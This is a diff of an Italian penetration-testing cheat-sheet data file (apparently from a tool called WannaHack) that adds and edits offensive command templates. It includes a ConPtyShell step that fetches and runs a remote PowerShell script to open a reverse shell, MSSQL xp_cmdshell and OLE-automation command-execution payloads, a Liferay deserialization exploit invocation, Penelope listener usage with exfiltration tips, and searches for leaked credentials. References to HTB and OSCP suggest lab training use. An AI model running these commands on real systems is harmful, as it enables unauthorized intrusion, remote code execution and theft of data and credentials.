@@ -1,4 +1,4 @@
-/* data.js — generato da WannaHack il 2026-10-27T14:24:37.426Z */
+/* data.js — generato da WannaHack il 2026-11-06T14:15:02.090Z */
 const COMMANDS = [
   {
     "id": "whois-domain",
@@ -101,7 +101,7 @@ const COMMANDS = [
       "dig",
       "dns"
     ],
-    "template": "# indirizzi e record principali, uno per tipo (la richiesta ANY oggi viene rifiutata)\ndig +noall +answer <domain> A @1.1.1.1\ndig +noall +answer <domain> AAAA @1.1.1.1\ndig +noall +answer <domain> MX @1.1.1.1\ndig +noall +answer <domain> TXT @1.1.1.1\n\n# name server e autorita della zona\ndig +noall +answer <domain> NS @1.1.1.1\ndig +noall +answer <domain> SOA @1.1.1.1",
+    "template": "for r in A AAAA MX NS TXT SOA; do dig +noall +answer <domain> $r @1.1.1.1; done",
     "params": [
       {
         "key": "domain",
@@ -550,7 +550,7 @@ const COMMANDS = [
       "osint",
       "recon"
     ],
-    "template": "# solo indirizzi archiviati da molte fonti\nwaymore -i <domain> -mode U",
+    "template": "waymore -i <domain> -mode U",
     "params": [
       {
         "key": "domain",
@@ -596,7 +596,7 @@ const COMMANDS = [
       "param-mining",
       "recon"
     ],
-    "template": "# indirizzi con parametri, ripuliti dai duplicati\ncat wayback.txt gau.txt | sort -u | grep '=' | uro > url_params.txt",
+    "template": "cat wayback.txt gau.txt | sort -u | grep '=' | uro > url_params.txt",
     "params": [],
     "variants": [
       {
@@ -644,7 +644,7 @@ const COMMANDS = [
       "osint",
       "emails"
     ],
-    "template": "theHarvester -d <domain> -b all -l 500 -f harvest",
+    "template": "theHarvester -d <domain> -b all | tee theharvester.txt",
     "params": [
       {
         "key": "domain",
@@ -978,7 +978,7 @@ const COMMANDS = [
       "secrets",
       "git"
     ],
-    "template": "# scandisce un repo gia clonato, inclusa la cronologia\ngitleaks detect --source <repo> -v",
+    "template": "gitleaks detect --source <repo> -v",
     "params": [
       {
         "key": "repo",
@@ -1022,7 +1022,7 @@ const COMMANDS = [
       "osint",
       "secrets"
     ],
-    "template": "# ricerca codice su GitHub (serve gh autenticato)\ngh search code '<domain> password' --limit 50",
+    "template": "gh search code '<domain> password' --limit 50",
     "params": [
       {
         "key": "domain",
@@ -1079,7 +1079,7 @@ const COMMANDS = [
       "credentials",
       "dehashed"
     ],
-    "template": "# cerca credenziali trapelate per un dominio\nh8mail -t <domain>",
+    "template": "h8mail -t <domain>",
     "params": [
       {
         "key": "domain",
@@ -2096,6 +2096,72 @@ const COMMANDS = [
     "note": "# Opzioni\n- `-t` numero di processi paralleli\n- `-x` estensioni da cercare, per esempio `php,html,txt,bak`"
   },
   {
+    "id": "feroxbuster",
+    "name": "feroxbuster — directory",
+    "category": "info-gathering",
+    "subcategory": "active-recon",
+    "group": "Directory Fuzzing",
+    "description": "Dir/file busting ricorsivo per natura: segue da solo le directory che trova. Scritto in Rust, molto veloce. Terza opzione accanto a ffuf e gobuster, utile quando serve la ricorsione automatica.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "feroxbuster",
+      "fuzzing",
+      "web"
+    ],
+    "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Base (ricorsivo)",
+        "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
+        "description": "Ricorsivo di default: scende da solo nelle directory trovate."
+      },
+      {
+        "id": "ext",
+        "label": "Con estensioni",
+        "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,bak,conf",
+        "description": "Aggiunge le estensioni ai nomi provati (senza punto, separate da virgola)."
+      },
+      {
+        "id": "force",
+        "label": "Forza 403",
+        "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --force-recursion",
+        "description": "Ricorre su TUTTI gli endpoint trovati, 403 compresi (di default un 403 viene seguito solo col `/` finale). Rispetta `-d` (default 4)."
+      },
+      {
+        "id": "norecurse",
+        "label": "Senza ricorsione",
+        "template": "feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -n",
+        "description": "Un solo livello, come un dirbuster classico."
+      }
+    ],
+    "refs": [
+      {
+        "label": "feroxbuster — Forced Recursion (docs)",
+        "url": "https://epi052.github.io/feroxbuster-docs/docs/examples/force_recursion/"
+      },
+      {
+        "label": "feroxbuster — GitHub",
+        "url": "https://github.com/epi052/feroxbuster"
+      }
+    ],
+    "note": "# Ricorsione e 403\nDi default feroxbuster scende da solo nelle directory trovate, ma un 403 lo segue solo se il path finisce con `/`. `--force-recursion` forza la ricorsione su tutti gli endpoint trovati, 403 compresi. Rispetta sempre `-d`/`--depth` (default 4; `0` = infinita). Se un 403 senza slash non viene seguito, aggiungi `-f`/`--add-slash`.\n# Filtri\n`-s` sceglie gli status da includere (default: tutti), `-C` li esclude (es. `-C 404,403`), `-S` filtra per dimensione: utili contro le pagine di errore identiche. Per ricorrere nei 403 NON filtrarli via.\n# Opzioni\n- `-x` estensioni (senza punto: `php,html,bak`), `-t` thread\n- `-r` segue i redirect, `-k` ignora il TLS non valido"
+  },
+  {
     "id": "add-hosts",
     "name": "/etc/hosts — aggiungi voci",
     "category": "info-gathering",
@@ -2705,7 +2771,7 @@ const COMMANDS = [
         "url": "https://man.openbsd.org/sftp.1"
       }
     ],
-    "note": "# Opzioni\nComandi dentro la shell: `ls` e `cd` (lato remoto), `lls` e `lcd` (lato locale), `get` e `put`, `mget` e `mput` per i gruppi di file, `get -r <dir>` per il ricorsivo."
+    "note": "# Opzioni\nComandi dentro la shell:\n- `ls` / `cd` — lato remoto\n- `lls` / `lcd` — lato locale\n- `get` / `put` — singolo file\n- `mget` / `mput` — gruppi di file\n- `get -r <dir>` — ricorsivo"
   },
   {
     "id": "ssh-rsync",
@@ -3774,7 +3840,7 @@ const COMMANDS = [
       "atlassian",
       "user-enum"
     ],
-    "template": "curl -sk 'http://<ip>/s/x/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml' | grep -i version",
+    "template": "# versione dal pom.xml via path traversal pre-auth\ncurl -sk 'http://<ip>/s/x/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml' | grep -i version\n\n# versione e build dall'endpoint serverInfo\ncurl -sk 'http://<ip>/rest/api/2/serverInfo'",
     "params": [
       {
         "key": "ip",
@@ -3834,7 +3900,7 @@ const COMMANDS = [
       "rce",
       "ssti"
     ],
-    "template": "curl -sk 'http://<ip>/plugins/servlet/gadgets/makeRequest?url=https://<ip>:1337@<lhost>'",
+    "template": "curl -sk 'http://<ip>/plugins/servlet/gadgets/makeRequest?url=https://<ip>:1337@<target>'",
     "params": [
       {
         "key": "ip",
@@ -3920,7 +3986,7 @@ const COMMANDS = [
       "portal",
       "jsonws"
     ],
-    "template": "# versione e stato della licenza\ncurl -sk 'http://<ip>/c/portal/license'\n\n# elenco dei servizi JSONWS esposti\ncurl -sk 'http://<ip>/api/jsonws' | head",
+    "template": "# versione e stato della licenza\ncurl -sk 'http://<ip>/c/portal/license'\n\n# verifica il portlet di login: conferma che è Liferay\ncurl -sk -o /dev/null -w '%{http_code}\\n' 'http://<ip>/?p_p_id=com_liferay_login_web_portlet_LoginPortlet'\n\n# verifica se l'endpoint GraphQL risponde\ncurl -sk 'http://<ip>/o/graphql' -H 'Content-Type: application/json' -d '{\"query\":\"{__typename}\"}'",
     "params": [
       {
         "key": "ip",
@@ -3986,7 +4052,7 @@ const COMMANDS = [
       "deserialization",
       "groovy"
     ],
-    "template": "# CVE-2020-7961 — deserializzazione JSONWS su Liferay < 7.2.1, via PoC pubblico\n\n# scarica il PoC ed entra nella cartella\ngit clone https://github.com/mzruya/CVE-2020-7961 && cd CVE-2020-7961\n\n# esegue il comando sul target\npython3 exploit.py http://<ip> '<cmd>'",
+    "template": "# Liferay < 7.2.1 — deserializzazione non autenticata su /api/jsonws\n# usa un PoC pubblico (es. mzruya/CVE-2020-7961 o il modulo relativo):\npython3 exploit.py http://<ip> '<cmd>'",
     "params": [
       {
         "key": "ip",
@@ -5821,7 +5887,7 @@ const COMMANDS = [
       "odat",
       "enum"
     ],
-    "template": "# audit completo del target Oracle\nodat all -s <ip>",
+    "template": "odat all -s <ip>",
     "params": [
       {
         "key": "ip",
@@ -6022,6 +6088,82 @@ const COMMANDS = [
         "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
       }
     ]
+  },
+  {
+    "id": "mysql-noninteractive",
+    "name": "mysql — query non-interattive (-e)",
+    "category": "service-enum",
+    "subcategory": "mysql",
+    "group": "Connection",
+    "description": "Esegue query MySQL senza aprire il prompt interattivo `mysql>`: indispensabile da una shell senza PTY (reverse shell grezza, webshell, RCE a comando singolo). Una query per comando, con l'output che torna subito.",
+    "platform": "cross-platform",
+    "requires": [
+      "password"
+    ],
+    "protocols": [
+      "mysql"
+    ],
+    "tags": [
+      "mysql",
+      "non-interactive",
+      "no-pty"
+    ],
+    "template": "mysql -u <dbuser> -p<dbpass> -h <dbhost> -e \"show databases;\"",
+    "params": [
+      {
+        "key": "dbuser",
+        "label": "DB user",
+        "placeholder": "kiosk_app"
+      },
+      {
+        "key": "dbpass",
+        "label": "DB password",
+        "placeholder": "K!0sk_R3pl1ca#DB"
+      },
+      {
+        "key": "dbhost",
+        "label": "DB host",
+        "placeholder": "127.0.0.1",
+        "default": "127.0.0.1"
+      },
+      {
+        "key": "db",
+        "label": "Database",
+        "placeholder": "htb_airways"
+      },
+      {
+        "key": "table",
+        "label": "Tabella",
+        "placeholder": "users"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Mostra database",
+        "template": "mysql -u <dbuser> -p<dbpass> -h <dbhost> -e \"show databases;\"",
+        "description": "Elenca i database senza entrare nel prompt."
+      },
+      {
+        "id": "tables",
+        "label": "Tabelle del DB",
+        "template": "mysql -u <dbuser> -p<dbpass> -h <dbhost> -D <db> -e \"show tables;\"",
+        "description": "`-D` seleziona il database (come `USE <db>`)."
+      },
+      {
+        "id": "dump",
+        "label": "Leggi una tabella",
+        "template": "mysql -u <dbuser> -p<dbpass> -h <dbhost> -e \"select * from <db>.<table>;\"",
+        "description": "Dump diretto di una tabella (qualifica con `<db>.<table>`)."
+      },
+      {
+        "id": "win",
+        "label": "Windows (mysql.exe)",
+        "template": "C:\\MySQL\\bin\\mysql.exe -u <dbuser> -p<dbpass> -h <dbhost> -e \"show databases;\"",
+        "description": "Stessa cosa dal client Windows col percorso completo."
+      }
+    ],
+    "note": "# Perché `-e` (shell senza PTY)\nUna reverse shell grezza (nc), una webshell o una RCE a comando singolo non hanno un TTY/PTY. Il client `mysql` interattivo apre il prompt `mysql>` che un TTY lo pretende: senza, o si blocca aspettando input che non puoi inviare, o esce subito. Idem `-p` da solo: chiede la password in modo interattivo e si impunta. Soluzione: modalità batch, una query e via.\n- `-e \"<query>\"` — esegue la query e torna subito l'output, niente prompt\n- `-D <db>` — seleziona il database (come `USE <db>`)\n- `-p<password>` — password attaccata, senza spazio: mai `-p` da solo senza PTY\n- più query: separale con `;` dentro `-e`, oppure `mysql ... < query.sql`\n# Attenzione\n- password con caratteri speciali (`#`, `!`, spazi): su shell Linux quotala → `-p'K!0sk_R3pl1ca#DB'`, oppure usa `MYSQL_PWD='...' mysql -u ... -e ...`\n- l'output batch ha le colonne separate da TAB: comodo da filtrare\n- stesso principio per altri client interattivi senza PTY: `psql -c`, `sqlite3 db \".tables\"`, `ssh host \"cmd\"`, `python3 -c`\n# Prossimo passo\nTrovati dati interessanti, valuta la RCE dal DB (vedi `MySQL — RCE Linux` o `MySQL — RCE Windows`) o riusa le credenziali trovate altrove."
   },
   {
     "id": "nmap-mysql",
@@ -6739,7 +6881,7 @@ const COMMANDS = [
       "cache",
       "enum"
     ],
-    "template": "memcstat --servers=<ip>",
+    "template": "# statistiche del server tramite client libmemcached\nmemcstat --servers=<ip>\n\n# stesse statistiche senza libmemcached, parlando il protocollo a mano\necho -e 'stats\\r' | nc -q1 <ip> 11211",
     "params": [
       {
         "key": "ip",
@@ -6976,6 +7118,331 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "penelope-listen",
+    "name": "Penelope — listener",
+    "category": "exploitation",
+    "subcategory": "listeners",
+    "group": "Penelope",
+    "description": "Riceve la reverse shell e aggiorna da solo la shell grezza a una PTY completa e interattiva. Da avviare prima di lanciare il payload sul target.\n<ul><li>Ctrl+C, frecce, history, TAB ed editor funzionanti</li><li>log di sessione salvato in automatico</li><li>gestisce più sessioni e listener insieme</li></ul>",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [],
+    "tags": [
+      "penelope",
+      "listener",
+      "pty"
+    ],
+    "template": "penelope",
+    "params": [
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "4444"
+      },
+      {
+        "key": "iface",
+        "label": "Interfaccia",
+        "placeholder": "tun0"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Base",
+        "template": "penelope",
+        "description": "Ascolta su 0.0.0.0:4444 con auto-upgrade a PTY."
+      },
+      {
+        "id": "port",
+        "label": "Porta",
+        "template": "penelope -p <lport>",
+        "description": "Porta diversa dalla 4444."
+      },
+      {
+        "id": "iface",
+        "label": "Interfaccia",
+        "template": "penelope -i <iface> -p <lport>",
+        "description": "Una sola interfaccia, es. tun0 sulla VPN del lab."
+      },
+      {
+        "id": "no-upgrade",
+        "label": "Senza upgrade",
+        "template": "penelope -U -p <lport>",
+        "description": "Disabilita l'auto-upgrade a PTY, se rompe la shell del target."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Penelope — repo ufficiale (brightio)",
+        "url": "https://github.com/brightio/penelope"
+      },
+      {
+        "label": "Kali Tools — penelope",
+        "url": "https://www.kali.org/tools/penelope/"
+      }
+    ],
+    "note": "# Perché Penelope\nFa quello che fa `nc` come listener, ma aggiorna da solo la shell a una PTY completa (Ctrl+C, frecce, history, editor, TAB) e gestisce più sessioni e listener insieme. Ogni sessione viene salvata su file di log in automatico.\n# Tasti rapidi in sessione\nDalla shell agganciata stacchi senza chiuderla e torni al Main Menu:\n- `F12` → shell PTY (il caso normale)\n- `Ctrl+C` → shell grezza / non aggiornata (invia SIGINT)\n- `Ctrl+D` → shell readline (invia EOF)\nPenelope mostra il tasto giusto a ogni aggancio. Dal menu: `sessions`/`interact` per rientrare, `Ctrl+C` di nuovo (o `exit`) per uscire da Penelope.\n# Menu interattivo\nCompletamento con TAB. Comandi principali:\n- `sessions`/`interact` — gestisci le sessioni\n- `upload`/`download` — trasferisci file\n- `portfwd` — port forwarding (pivoting)\n- `spawn` — apri altre shell\n- `script`/`run`/`exec` — esegui comandi e moduli in memoria\n- `maintain` — tieni viva la sessione\n- `help` — elenco completo\n# Prossimo passo\nAppena arriva la connessione la shell è già interattiva: `download` per esfiltrare, `upload` per caricare tool (es. linpeas), `portfwd` per raggiungere i servizi interni. Installa con `sudo apt install penelope` su Kali oppure `pipx install git+https://github.com/brightio/penelope`."
+  },
+  {
+    "id": "penelope-connect",
+    "name": "Penelope — payload & connessione",
+    "category": "exploitation",
+    "subcategory": "listeners",
+    "group": "Penelope",
+    "description": "Modi di aggancio oltre al semplice ascolto:\n<ul><li>mostra reverse shell già pronte per i listener attivi</li><li>si collega a una bind shell aperta sul target</li><li>entra via SSH e cattura la shell in locale</li></ul>",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [],
+    "tags": [
+      "penelope",
+      "payload",
+      "bind",
+      "ssh"
+    ],
+    "template": "penelope -p <lport> -a",
+    "params": [
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "4444"
+      },
+      {
+        "key": "ip",
+        "label": "IP",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "user",
+        "label": "User",
+        "ctx": "user",
+        "placeholder": "user"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Mostra payload",
+        "template": "penelope -p <lport> -a",
+        "description": "Avvia il listener e stampa esempi di reverse shell pronti per i listener attivi."
+      },
+      {
+        "id": "bind",
+        "label": "Bind shell",
+        "template": "penelope -c <ip> -p <lport>",
+        "description": "Si collega a una bind shell già aperta sul target invece di ascoltare."
+      },
+      {
+        "id": "ssh",
+        "label": "SSH reverse",
+        "template": "penelope ssh <user>@<ip>",
+        "description": "Entra via SSH sul target e cattura in locale la reverse shell."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Penelope — repo ufficiale (brightio)",
+        "url": "https://github.com/brightio/penelope"
+      },
+      {
+        "label": "Kali Tools — penelope",
+        "url": "https://www.kali.org/tools/penelope/"
+      }
+    ],
+    "note": "# Quando usarli\n`-a` è comodo per incollare al volo una reverse shell tarata sul listener attivo. `-c` serve quando sul target gira già una bind shell. La forma `ssh` apre la sessione e cattura la reverse shell in un colpo solo.\n# Nota\nI payload mostrati da `-a` vanno comunque eseguiti sul target: tienili come riferimento, non come exploit automatico."
+  },
+  {
+    "id": "penelope-serve",
+    "name": "Penelope — file server HTTP",
+    "category": "exploitation",
+    "subcategory": "listeners",
+    "group": "Penelope",
+    "description": "Server HTTP integrato per trasferire file sul target senza tirare su un altro web server. Porta di default 8000.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [],
+    "tags": [
+      "penelope",
+      "file-transfer",
+      "http"
+    ],
+    "template": "penelope -s <path>",
+    "params": [
+      {
+        "key": "path",
+        "label": "File/Cartella",
+        "placeholder": "linpeas.sh"
+      },
+      {
+        "key": "lport",
+        "label": "Porta",
+        "placeholder": "8000"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Serve file/cartella",
+        "template": "penelope -s <path>",
+        "description": "Espone un file o una cartella via HTTP (porta 8000)."
+      },
+      {
+        "id": "port",
+        "label": "Porta custom",
+        "template": "penelope -s <path> -p <lport>",
+        "description": "Sulla porta scelta invece della 8000."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Penelope — repo ufficiale (brightio)",
+        "url": "https://github.com/brightio/penelope"
+      },
+      {
+        "label": "Kali Tools — penelope",
+        "url": "https://www.kali.org/tools/penelope/"
+      }
+    ],
+    "note": "# Prossimo passo\nUna volta avuta la sessione, per i trasferimenti conviene usare i comandi `upload`/`download` dal Main Menu: passano dentro la sessione, senza esporre una porta in più."
+  },
+  {
+    "id": "penelope-sessions",
+    "name": "Penelope — sessioni & esame",
+    "category": "exploitation",
+    "subcategory": "listeners",
+    "group": "Penelope",
+    "description": "Opzioni per la gestione delle sessioni e la conformità d'esame:\n<ul><li>tiene vive N sessioni per target</li><li>modalità OSCP-safe</li><li>parte direttamente nel Main Menu</li></ul>",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [],
+    "tags": [
+      "penelope",
+      "session",
+      "oscp"
+    ],
+    "template": "penelope -m <n> -p <lport>",
+    "params": [
+      {
+        "key": "n",
+        "label": "N sessioni",
+        "placeholder": "2"
+      },
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "4444"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Mantieni N",
+        "template": "penelope -m <n> -p <lport>",
+        "description": "Tiene vive N sessioni per target, rimpiazzando quelle che muoiono."
+      },
+      {
+        "id": "oscp",
+        "label": "OSCP-safe",
+        "template": "penelope -O -p <lport>",
+        "description": "Guardrail per l'esame OSCP: evita violazioni accidentali mettendo in sicurezza i moduli che automatizzano l'exploitation (es. `traitor`, meterpreter). Il resto di Penelope è già conforme."
+      },
+      {
+        "id": "menu",
+        "label": "Avvia nel menu",
+        "template": "penelope -M",
+        "description": "Parte direttamente nel Main Menu invece di mettersi in ascolto."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Penelope — repo ufficiale (brightio)",
+        "url": "https://github.com/brightio/penelope"
+      },
+      {
+        "label": "Kali Tools — penelope",
+        "url": "https://www.kali.org/tools/penelope/"
+      }
+    ],
+    "note": "# Note\n`-m N` è utile con shell instabili: Penelope riapre la sessione quando cade. `-O` attiva un guardrail che mette in sicurezza i moduli di exploitation automatica (es. `traitor`) per non violare per sbaglio le regole OSCP: verifica sempre le regole OffSec aggiornate. `-M` apre il menu senza aprire subito un listener."
+  },
+  {
+    "id": "penelope-opsec",
+    "name": "Penelope — opsec & utility",
+    "category": "exploitation",
+    "subcategory": "listeners",
+    "group": "Penelope",
+    "description": "Opzioni di pulizia operativa e piccole utility:\n<ul><li>disabilita i log di sessione (contengono dati sensibili del target)</li><li>elenca le interfacce di rete locali</li><li>non agganciarti in automatico, per raccogliere più shell</li><li>limita le sessioni accettate per host</li></ul>",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [],
+    "tags": [
+      "penelope",
+      "opsec",
+      "no-log",
+      "utility"
+    ],
+    "template": "penelope -L -p <lport>",
+    "params": [
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "4444"
+      },
+      {
+        "key": "n",
+        "label": "N sessioni",
+        "placeholder": "5"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Senza log",
+        "template": "penelope -L -p <lport>",
+        "description": "Non scrive i file di log della sessione, che possono contenere dati sensibili del target."
+      },
+      {
+        "id": "interfaces",
+        "label": "Elenca interfacce",
+        "template": "penelope -l",
+        "description": "Stampa le interfacce di rete locali (per trovare il tuo IP, es. tun0) ed esce."
+      },
+      {
+        "id": "no-attach",
+        "label": "Non agganciare",
+        "template": "penelope -C -p <lport>",
+        "description": "Non si attacca in automatico alle nuove sessioni: utile per raccogliere più shell e gestirle dal Main Menu."
+      },
+      {
+        "id": "max-sessions",
+        "label": "Limita sessioni",
+        "template": "penelope -ms <n> -p <lport>",
+        "description": "Massimo N sessioni per host (default 5; 0 = rifiuta tutte le nuove)."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Penelope — repo ufficiale (brightio)",
+        "url": "https://github.com/brightio/penelope"
+      },
+      {
+        "label": "Kali Tools — penelope",
+        "url": "https://www.kali.org/tools/penelope/"
+      }
+    ],
+    "note": "# Opsec\nI log (`-L` per disattivarli) catturano tutto l'output della sessione, credenziali incluse: su target reali valuta se tenerli. `-C` evita di finire dentro una shell appena arriva, comodo quando ti aspetti molte callback: le gestisci poi con `sessions`/`interact` dal menu.\n# Utility\n`penelope -l` elenca le interfacce ed esce: utile al volo per leggere il tuo IP di tunnel (tun0) prima di tarare il payload."
+  },
+  {
     "id": "kali-webshells",
     "name": "Web shell preinstallate (Kali)",
     "category": "exploitation",
@@ -7030,7 +7497,7 @@ const COMMANDS = [
     "name": "Stabilizza shell (PTY)",
     "category": "exploitation",
     "subcategory": "shell-stab",
-    "group": "TTY Upgrade",
+    "group": "Linux (TTY Upgrade)",
     "description": "Trasforma una shell grezza in una TTY interattiva (Ctrl+C, history, editor). La sequenza completa è nella variante apposita.",
     "platform": "linux",
     "requires": [
@@ -7073,13 +7540,76 @@ const COMMANDS = [
     "note": "# Sequenza completa\nLa variante Upgrade completo fa: spawn del PTY, poi `Ctrl+Z`, quindi `stty raw -echo; fg`, infine `export TERM=xterm`. Senza l'ultimo passo editor e clear non funzionano.\n# Errori comuni\nSe il terminale resta sporco dopo un crash, `reset` lo ripulisce. Imposta le dimensioni con `stty rows <r> cols <c>` (leggile con `stty size` nel tuo terminale) per usare bene gli editor a schermo intero."
   },
   {
+    "id": "shell-windows-conpty",
+    "name": "Shell Windows — upgrade (ConPtyShell)",
+    "category": "exploitation",
+    "subcategory": "shell-stab",
+    "group": "Windows (ConPTY)",
+    "description": "Su Windows il trucco Linux (`python pty` + `stty`) non dà una PTY. Per una shell davvero interattiva (frecce, TAB, cls, programmi interattivi) su Windows 10 / Server 2019+ si usa ConPtyShell. In alternativa, con credenziali/hash conviene cambiare canale (evil-winrm/RDP).",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "conpty",
+      "windows",
+      "pty",
+      "upgrade"
+    ],
+    "template": "# 1) sul tuo Kali: listener in raw (invia righe/colonne per dimensionare la PTY)\nstty raw -echo; (stty size; cat) | nc -lvnp <lport>\n\n# 2) sul target, nella shell che hai: carica ed esegui ConPtyShell verso di te\nIEX(IWR -useb http://<lhost>/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell <lhost> <lport>",
+    "params": [
+      {
+        "key": "lhost",
+        "label": "LHOST (tu)",
+        "placeholder": "10.10.14.5"
+      },
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "3001"
+      },
+      {
+        "key": "rows",
+        "label": "Righe",
+        "placeholder": "51"
+      },
+      {
+        "key": "cols",
+        "label": "Colonne",
+        "placeholder": "203"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "ConPtyShell (reverse)",
+        "template": "# 1) sul tuo Kali: listener in raw (invia righe/colonne per dimensionare la PTY)\nstty raw -echo; (stty size; cat) | nc -lvnp <lport>\n\n# 2) sul target, nella shell che hai: carica ed esegui ConPtyShell verso di te\nIEX(IWR -useb http://<lhost>/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell <lhost> <lport>",
+        "description": "Flusso completo in 2 passi: prima il listener raw sul Kali, poi ConPtyShell sul target. Vanno insieme."
+      },
+      {
+        "id": "upgrade",
+        "label": "Upgrade in-place",
+        "template": "IEX(IWR -useb http://<lhost>/Invoke-ConPtyShell.ps1); Invoke-ConPtyShell -Upgrade -Rows <rows> -Cols <cols>",
+        "description": "Aggiorna la reverse shell che hai già, senza nuova connessione (un comando solo)."
+      },
+      {
+        "id": "ps",
+        "label": "cmd → PowerShell",
+        "template": "powershell -nop -ep bypass",
+        "description": "Da cmd a PowerShell: shell migliore (non una PTY)."
+      }
+    ],
+    "note": "# Windows ≠ Linux\nIl trucco Linux (`python pty`, `stty raw -echo`) non produce una PTY su Windows. La shell interattiva vera, su Windows 10 / Server 2019+, si ottiene con **ConPtyShell** (API ConPTY).\n# ConPtyShell (reverse, consigliato)\n- Sul Kali apri il listener in raw passando le dimensioni: `stty raw -echo; (stty size; cat) | nc -lvnp <lport>`\n- Sul target carica ed esegui `Invoke-ConPtyShell <lhost> <lport>`: ottieni frecce, TAB, `cls` e programmi interattivi.\n- Al rientro `reset` ripulisce il tuo terminale.\n# Senza ConPTY: cambia canale\nCon credenziali o hash, molto meglio abbandonare la shell grezza:\n- `evil-winrm -i <ip> -u <user> -p <pass>` (o `-H <hash>`) — PowerShell remoting stabile, con upload/download\n- RDP: `xfreerdp /v:<ip> /u:<user> /p:<pass>`\n- Meterpreter: sessione stabile, poi `migrate` su un processo affidabile\n# Nota\npenelope auto-upgrada solo le shell Unix: su Windows gestisce la sessione ma non dà una PTY."
+  },
+  {
     "id": "mssql-xpcmdshell",
     "name": "MSSQL — xp_cmdshell RCE",
     "category": "exploitation",
     "subcategory": "infrastructure",
     "group": "MSSQL (1433)",
     "description": "`xp_cmdshell` esegue comandi del sistema operativo con i privilegi dell'account di servizio SQL, che spesso è un account di dominio. È disabilitato di default e va riattivato con `sp_configure`, operazione che richiede il ruolo sysadmin. L'output del comando torna nella griglia dei risultati.",
-    "note": "# Se la riconfigurazione fallisce\nIl messaggio `SQL Server blocked access to procedure 'sys.xp_cmdshell'` indica che l'utente non è sysadmin. In quel caso la via è l'impersonation di un login sysadmin, oppure la cattura del NetNTLMv2 con `xp_dirtree` verso una share controllata.",
+    "note": "# Se la riconfigurazione fallisce\nIl messaggio `SQL Server blocked access to procedure 'sys.xp_cmdshell'` indica che l'utente non è sysadmin. In quel caso la via è l'impersonation di un login sysadmin, oppure la cattura del NetNTLMv2 con `xp_dirtree` verso una share controllata.\n# Se xp_cmdshell è bloccato\nOltre a impersonation e xp_dirtree, prova le OLE Automation Procedures (variante OLE): `sp_OACreate`/`sp_OAMethod` eseguono comandi senza xp_cmdshell, ma in modo blind (nessun output) → punta a una reverse shell.",
     "platform": "cross-platform",
     "requires": [
       "password"
@@ -7098,6 +7628,20 @@ const COMMANDS = [
         "key": "cmd",
         "label": "Command",
         "placeholder": "whoami"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "xp_cmdshell",
+        "template": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '<cmd>';",
+        "description": "Abilita xp_cmdshell (serve sysadmin) ed esegue il comando. Output nella griglia dei risultati."
+      },
+      {
+        "id": "ole",
+        "label": "OLE automation (sp_OACreate)",
+        "template": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @o INT; EXEC sp_oacreate 'wscript.shell', @o OUT; EXEC sp_oamethod @o, 'run', NULL, '<cmd>';",
+        "description": "Fallback se xp_cmdshell è bloccato: usa le OLE Automation Procedures. Esecuzione blind (nessun output) → lancia una reverse shell."
       }
     ]
   },
@@ -7227,6 +7771,12 @@ const COMMANDS = [
         "label": "Query remota",
         "template": "EXECUTE('SELECT @@servername, SYSTEM_USER') AT [<linked>];",
         "description": "Esegue una query sul linked server; verifica con quale identità gira."
+      },
+      {
+        "id": "rce",
+        "label": "RCE sul linked server",
